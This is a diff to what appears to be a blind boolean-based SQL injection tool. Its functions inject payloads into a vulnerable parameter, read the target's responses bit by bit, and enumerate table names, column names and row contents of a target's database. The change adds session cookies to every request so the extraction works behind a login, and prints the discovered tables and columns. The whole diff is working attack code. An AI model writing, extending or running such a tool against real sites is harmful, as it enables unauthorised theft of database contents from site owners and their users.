@@ -18,14 +18,14 @@ def prepPayloadLightSpeed(params, vulnPoint, payloads, row, extract, pos, tblNam
     newParams[vulnPoint] = injPayload
     return newParams
 
-def extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract, tblName=None, clmName=None, max_length=100):
+def extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract, tblName=None, clmName=None, cookies=None, max_length=100):
     x = ''
     pos = 1
 
     def getCharacters(payload, t1, t2, t3, t4, t5, t6, t7):
         temp = ''
         newParams = prepPayloadLightSpeed(params, vulnPoint, payload, row, extract, pos, tblName=tblName, clmName=clmName)
-        r = sendReq(url, data=newParams, allow_redirects=False) if d else sendReq(url, params=newParams, allow_redirects=False)
+        r = sendReq(url, data=newParams, cookies=cookies, allow_redirects=False) if d else sendReq(url, params=newParams, cookies=cookies, allow_redirects=False)
         zV = 2 if payload == payload3 else 3
         if r.text == t1.text:
             temp += bin(1)[2:].zfill(zV)
@@ -61,11 +61,11 @@ def extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, pay
             pos += 1
     return x
 
-def extractTablesLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d):
+def extractTablesLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, cookies=None):
     row = 0
     tblNames = []
     while True:
-        tempTbl = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='tbls')
+        tempTbl = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='tbls', cookies=cookies)
         if tempTbl:
             print ()
             tblNames.append(tempTbl)
@@ -74,13 +74,15 @@ def extractTablesLightSpeed(url, params, vulnPoint, payload1, payload2, payload3
             break
     return tblNames
 
-def extractColumnsLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tblNames):
+def extractColumnsLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tblNames, cookies=None):
+    if tblNames:
+        print (Fore.YELLOW + f"Tables: {tblNames}" + Fore.RESET)
     clmNames = {}
     for tblName in tblNames:
         row = 0
         clmNames[tblName] = []
         while True:
-            tempClm = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='clms', tblName=tblName)
+            tempClm = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='clms', tblName=tblName, cookies=cookies)
             if tempClm:
                 print ()
                 clmNames[tblName].append(tempClm)
@@ -89,7 +91,9 @@ def extractColumnsLightSpeed(url, params, vulnPoint, payload1, payload2, payload
                 break
     return clmNames
     
-def extractInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tblNames, clmNames):
+def extractInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tblNames, clmNames, cookies=None):
+    if clmNames:
+        print (Fore.YELLOW + f"Columns: {clmNames}" + Fore.RESET)
     info = {}
     for tblName in tblNames:
         row = 0
@@ -98,7 +102,7 @@ def extractInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, 
             tempDict = {}
             for clmName in clmNames[tblName]:
                 print ()
-                tempInfo = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='info', tblName=tblName, clmName=clmName)
+                tempInfo = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, row, d, extract='info', tblName=tblName, clmName=clmName, cookies=cookies)
                 tempDict[clmName] = tempInfo
             if not any(tempDict.values()):
                 break
@@ -106,11 +110,11 @@ def extractInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, 
             row += 1
     return info              
 
-def extractLightspeedMain(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tbl=None, clm=None):
+def extractLightspeedMain(url, params, vulnPoint, payload1, payload2, payload3, t1, t2, t3, t4, t5, t6, t7, d, tbl=None, clm=None, cookies=None):
     info = {}
-    tblNames = [tbl] if tbl is not None else extractTablesLightSpeed(url, params, vulnPoint, payload1[0], payload2[0], payload3[0], t1, t2, t3, t4, t5, t6, t7, d)
-    clmNames = {tbl: clm} if clm is not None else extractColumnsLightSpeed(url, params, vulnPoint, payload1[1], payload2[1], payload3[1], t1, t2, t3, t4, t5, t6, t7, d, tblNames)
-    info.update(extractInfoLightSpeed(url, params, vulnPoint, payload1[2], payload2[2], payload3[2], t1, t2, t3, t4, t5, t6, t7, d, tblNames, clmNames))
+    tblNames = [tbl] if tbl is not None else extractTablesLightSpeed(url, params, vulnPoint, payload1[0], payload2[0], payload3[0], t1, t2, t3, t4, t5, t6, t7, d, cookies=cookies)
+    clmNames = {tbl: clm} if clm is not None else extractColumnsLightSpeed(url, params, vulnPoint, payload1[1], payload2[1], payload3[1], t1, t2, t3, t4, t5, t6, t7, d, tblNames, cookies=cookies)
+    info.update(extractInfoLightSpeed(url, params, vulnPoint, payload1[2], payload2[2], payload3[2], t1, t2, t3, t4, t5, t6, t7, d, tblNames, clmNames, cookies=cookies))
     
     if tbl is None and clm is None and info:
         return True, info
